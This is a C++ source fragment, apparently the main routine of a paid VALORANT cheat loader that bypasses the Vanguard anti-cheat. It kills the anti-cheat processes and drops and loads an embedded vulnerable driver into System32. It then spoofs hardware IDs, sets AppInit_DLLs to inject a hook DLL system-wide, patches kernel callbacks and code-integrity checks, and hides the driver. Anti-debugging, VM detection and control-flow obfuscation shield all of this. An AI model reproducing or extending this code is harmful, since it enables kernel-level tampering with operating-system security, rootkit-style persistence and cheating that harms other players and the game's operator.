            g_k32.Sleep(2000);
            system("cls");
        }
    }

    char hwid[32] = {0};
    GetHwId(hwid, sizeof(hwid));
    JunkLoop(); Obfuscate();

    bool first = true;
    char key[128] = {0};
    while (true) {
        if (!first) {
            if (g_daysLeft == -2) printf("\nKey has expired!\n");
            else printf("\nInvalid key!\n");
            g_k32.Sleep(1000);
            system("cls");
        }
        first = false;
        printf("Enter your key: ");
        gets_s(key);
        if (strlen(key) == 0) continue;
        if (VerifyViaServer(key, hwid, serverHost, serverPath)) break;
    }

    system("cls");
    if (g_daysLeft > 0) {
        printf("  Successful key!\n");
        printf("  Key expires in %d days\n\n", g_daysLeft);
    } else if (g_daysLeft == 0) {
        printf("  Successful key!\n");
        printf("  Key expires TODAY!\n\n");
    } else {
        printf("  Successful key!\n\n");
    }
    g_k32.Sleep(1000);
    system("cls");

    strcpy_s(g_myKey, key);
    HANDLE hbThread = g_k32.CreateThread(NULL, 0, HeartbeatThread, NULL, 0, NULL);
    if (hbThread) g_k32.CloseHandle(hbThread);

    // Start VALORANT patch thread (waits for VALORANT.exe and patches VGC check)
    HANDLE pvThread = g_k32.CreateThread(NULL, 0, PatchValorantThread, NULL, 0, NULL);
    if (pvThread) g_k32.CloseHandle(pvThread);

    char input[16] = {0};
    while (input[0] != '1') {
        printf("Vanguard bypass (1): ");
        gets_s(input);
        if (input[0] == '1') break;
        printf("  [!] Please enter 1 to continue.\n");
    }

    printf("\n  %s\n\n", DE(_e_vanguard));

    // Protection checks before bypass
    HideFromDebugger();
    if (CheckHWBreakpoints()) { printf("\n%s", DE(_e_dbgDet)); system("pause"); return 1; }
    if (DetectVM()) { printf("\n%s", DE(_e_vmDet)); system("pause"); return 1; }
    if (!TimingTrap()) { printf("\n[!] Timing anomaly detected!\n"); system("pause"); return 1; }

    // CFF v2 - 7 states, guaranteed sequential
    std::string dpCFF;
    volatile int _cff = 0;
    while (_cff < 7) {
        volatile int _cff_j1 = _cff * POLY_CFF_C1;
        volatile int _cff_j2 = _cff_j1 ^ POLY_CFF_C2;
        JUNK_CODE();
        if (__rdtsc() || 1) {
            switch (_cff) {
                case 0: {
                    KillProcess(DE(_e_vgt));
                    KillProcess(DE(_e_val)); KillProcess(DE(_e_riot));
                    Bar(10, 50); g_k32.Sleep(200);
                } break;
                case 1: {
                    // Extract embedded driver to temp directory
                    char sysPath[MAX_PATH] = {0};
                    GetSystemDirectoryA(sysPath, MAX_PATH);
                    char drvPath[MAX_PATH] = {0};
                    strcpy_s(drvPath, sysPath);
                    strcat_s(drvPath, "\\drivers\\vgbypass.sys");
                    // Ensure directory exists
                    CreateDirectoryA((std::string(sysPath) + "\\drivers").c_str(), NULL);
                    // Write primary driver (BiosToolCommonDriver)
                    {
                        HANDLE hDrvFile = CreateFileA(drvPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                        if (hDrvFile != INVALID_HANDLE_VALUE) {
                            DWORD w = 0;
                            WriteFile(hDrvFile, g_driver_data, g_driver_data_sz, &w, NULL);
                            CloseHandle(hDrvFile);
                        } else {
                            // Fallback: write secondary driver
                            strcpy_s(drvPath, sysPath);
                            strcat_s(drvPath, "\\drivers\\vgbypass2.sys");
                            HANDLE hDrvFile = CreateFileA(drvPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                            if (hDrvFile != INVALID_HANDLE_VALUE) {
                                DWORD w = 0;
                                WriteFile(hDrvFile, g_driver2_data, g_driver2_data_sz, &w, NULL);
                                CloseHandle(hDrvFile);
                            } else {
                                printf("\nFailed to extract driver!\n"); system("pause"); return 1;
                            }
                        }
                    }
                    dpCFF = drvPath;
                    Bar(20, 50); g_k32.Sleep(200);
                } break;
                case 2: {
                    SetCrashFlag();
                    if (!LoadDriverViaSc(dpCFF.c_str())) { printf("\nDriver load failed!\n"); system("pause"); return 1; }
                    Bar(45, 50); g_k32.Sleep(200);
                } break;
                case 3: {
                    g_hDrv = OpenDrv();
                    if (g_hDrv == INVALID_HANDLE_VALUE) { printf("\nDriver connect failed!\n"); Shutdown(); system("pause"); return 1; }
                    CleanupDriverFile(dpCFF.c_str());
                    g_ioctlMode = ProbeIOCTL();
                    printf("\r[IOCTL] Mode=%d          \n", g_ioctlMode);
                    SpoofHWID();
                    HideVanguard();
                    // Extract vghook.dll and set AppInit_DLLs for automatic injection
                    {
                        char sysPath[MAX_PATH] = {0};
                        GetSystemDirectoryA(sysPath, MAX_PATH);
                        strcat_s(sysPath, "\\vghook.dll");
                        HANDLE hDll = CreateFileA(sysPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                        if (hDll != INVALID_HANDLE_VALUE) {
                            DWORD w = 0;
                            WriteFile(hDll, g_vghook_dll, g_vghook_dll_sz, &w, NULL);
                            CloseHandle(hDll);
                        }
                        SetAppInitDlls(sysPath);
                    }
                    Bar(60, 50); g_k32.Sleep(200);
                } break;
                case 4: {
                    g_ntBase = Fnd("ntoskrnl.exe"); g_drvBase = Fnd("BiosToolCommonDriver");
                    if (!g_drvBase) g_drvBase = Fnd("cpqsysio64");
                    KernelAntiDebugCheck();
                    if (CheckInt3Patches()) { printf("\n[!] Code patched by debugger!\n"); system("pause"); return 1; }
                    PatchCallbacks();
                    Bar(75, 50); g_k32.Sleep(200);
                } break;
                case 5: {
                    PatchCi();
                    Bar(90, 50); g_k32.Sleep(200);
                } break;
                case 6: {
                    if (g_drvBase) HideDriver(g_drvBase);
                    Bar(100, 50); g_k32.Sleep(200);
                } break;
            }
        }
        _cff++;
    }

    printf("\n============================================\n");
    printf("  BYPASS SUCCESSFUL!\n");
    printf("  Close this window with X to exit.\n");
    printf("============================================\n\n");
    fflush(stdout);

    g_k32.Beep(600, 200);

    // Keep alive - only X button closes
    while (true) {
        Sleep(1000);
    }

    AntiDump();
    g_hbRunning = false;
    Shutdown();
    return 0;
}
